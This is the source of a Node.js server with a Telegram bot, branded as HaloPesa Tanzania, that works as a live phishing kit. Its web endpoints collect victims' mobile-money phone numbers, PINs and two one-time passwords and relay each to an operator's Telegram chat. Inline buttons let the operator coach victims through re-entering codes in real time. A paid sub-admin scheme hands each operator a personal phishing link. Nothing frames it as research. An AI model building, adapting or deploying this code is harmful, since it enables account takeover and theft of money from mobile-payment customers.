/**
 * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
 * Configured for independent sub-admin routing.
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function isValidHaloPesaNumber(number) {
  const clean = String(number || '').replace(/\D/g, '');
  return /^(061|062|063)\d{7}$/.test(clean);
}

/**
 * Resolves the target admin chat ID independently.
 * Ensures sub-admins handle their own links and route exclusively to themselves.
 */
function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
      return targetAdmin; // Route directly to sub-admin independently
    }
  }
  return null;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  try {
    await bot.setWebHook(webhookUrl);
    app.post(webhookPath, (req, res) => {
      res.sendStatus(200);
      try { bot.processUpdate(req.body); } catch (err) {}
    });
  } catch (err) {
    process.exit(1);
  }

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || '';
      const firstName = chatInfo.first_name || msg.from.first_name || 'Mtumiaji';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 *Karibu Msimamizi Mkuu*\nKiungo chako kikuu: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, { authorized: false, paid: false, username, firstName, lastName, startedAt: new Date() });
        saveAdmins();
      }

      const record = admins.get(chatId);
      if (!record.authorized || !record.paid) {
        await bot.sendMessage(FALLBACK_ADMIN_ID, 
          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini/Malipo!*\n\n` +
          `👤 *Jina:* ${firstName}\n` +
          `🆔 *Chat ID:* \`${chatId}\``, 
          { parse_mode: 'Markdown' }
        );

        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako inasubiri idhini na malipo kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
        return;
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako binafsi kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { contact: 'Haijulikani', adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ Hatua ya 1 ya OTP imeruhusiwa kwa namba ${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Ufikiaji Umekataliwa`);
          break;
        case 'CORRECT_OTP':
          session.status = 'TRIGGER_SECOND_OTP';
          await bot.sendMessage(chatTarget, `✅ OTP ya Kwanza Imethibitishwa. Sasa inasubiri OTP ya Pili.`);
          break;
        case 'FINAL_SUCCESS':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Mafanikio yamethibitishwa kikamilifu.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.otp1 = '';
          session.otp2 = '';
          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi - Inarudishwa kwenye PIN`);
          break;
        case 'WRONG_OTP':
          session.status = 'RETRY_OTP';
          session.otp1 = '';
          session.otp2 = '';
          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi - Inarudishwa kuweka OTP mpya`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contact, pin, amount, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanContact = String(contact || '').replace(/\D/g, '');
    if (!isValidHaloPesaNumber(cleanContact)) {
      return res.status(400).json({ success: false, error: 'Weka namba halali ya HaloPesa kuanzia na 061, 062, au 063.' });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa, hajalipia au kiungo sio sahihi.' });
    }

    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
    sessions.set(userId, { 
      contact: cleanContact, 
      pin, 
      amount: amount || 'TZS 100,000', 
      adminChatId: targetChat, 
      status: 'WAITING_PIN_APPROVAL' 
    });

    const message = `NEW HALOPESA APPLICATION\n\nNUMBER: ${cleanContact}\nPIN: ${pin}`;
    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: 'DENY', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      const sentMsg = await bot.sendMessage(targetChat, message, opts);
      sessions.get(userId).adminMsgId = sentMsg.message_id;
    }
    
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu ya mtandao' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status, otp: session.otp1 || '' });
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp, step } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });

    const targetChat = session.adminChatId;

    if (step === 2) {
      session.status = 'WAITING_FINAL_OTP_VERIFICATION';
      session.otp2 = otp;
      const message = `HALOPESA FINAL OTP (STEP 2)\n\nNUMBER: ${session.contact}\nOTP 2: ${otp}`;
      const opts = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'WRONG OTP', callback_data: `WRONG_OTP_${userId}` },
              { text: 'APPROVE', callback_data: `FINAL_SUCCESS_${userId}` }
            ]
          ]
        }
      };
      if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    } else {
      session.status = 'WAITING_OTP_VERIFICATION';
      session.otp1 = otp;
      const message = `HALOPESA OTP SUBMISSION (STEP 1)\n\nNUMBER: ${session.contact}\nOTP 1: ${otp}`;
      const opts = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
              { text: 'WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
            ],
            [
              { text: 'CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
            ]
          ]
        }
      };
      if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
});
